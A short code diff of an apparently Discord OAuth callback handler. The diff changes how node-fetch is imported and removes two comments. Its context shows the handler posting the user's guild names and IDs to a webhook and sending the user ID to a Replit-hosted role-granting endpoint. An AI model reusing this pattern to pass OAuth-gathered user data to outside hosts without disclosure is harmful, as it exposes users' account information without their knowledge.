@@ -1,4 +1,4 @@
-const fetch = (...args) => import('node-fetch').then(({default: fetch}) => fetch(...args));
+const fetch = require("node-fetch");
 
 module.exports = async function handler(req, res) {
   const code = req.query.code;
@@ -42,7 +42,6 @@ module.exports = async function handler(req, res) {
 
   const guildList = guildsData.slice(0, 10).map(g => `• ${g.name} (${g.id})`).join("\n") || "None";
 
-  // Log to webhook
   await fetch(webhookURL, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
@@ -66,7 +65,6 @@ module.exports = async function handler(req, res) {
     }),
   }).catch(console.error);
 
-  // Send user ID to Replit bot
   await fetch("https://SilentMinorBase.lokdsnk.repl.co/grant-role", {
     method: "POST",
     headers: { "Content-Type": "application/json" },
